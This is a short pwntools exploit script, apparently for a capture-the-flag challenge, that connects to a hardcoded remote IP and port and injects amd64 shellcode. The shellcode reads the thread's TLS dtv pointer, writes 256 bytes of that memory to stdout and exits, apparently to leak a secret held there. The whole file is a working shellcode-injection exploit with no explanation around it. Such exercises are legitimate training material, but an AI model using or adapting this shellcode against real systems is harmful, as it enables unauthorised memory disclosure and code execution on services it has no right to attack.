from pwn import *
#elf = ELF('/home/kali/Downloads/file')
#p=elf.process()

cyberedu = '34.159.240.221:30117'
context.arch = "amd64"

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)


context.os = "linux"

sc = asm(r"""
    /* rbx = dtv */
    mov rbx, qword ptr fs:[0x8]

    /* rsi = dtv[0] (first TLS module) */
    mov rsi, [rbx + 16]

    mov rdi, 1          /* stdout */
    mov rdx, 256        /* dump size */

    mov rax, 1          /* write */
    syscall

    xor rdi, rdi
    mov rax, 60
    syscall
""")

p.recvuntil(b"!!!\n")
p.send(sc)
print(p.recvall())


p.interactive()
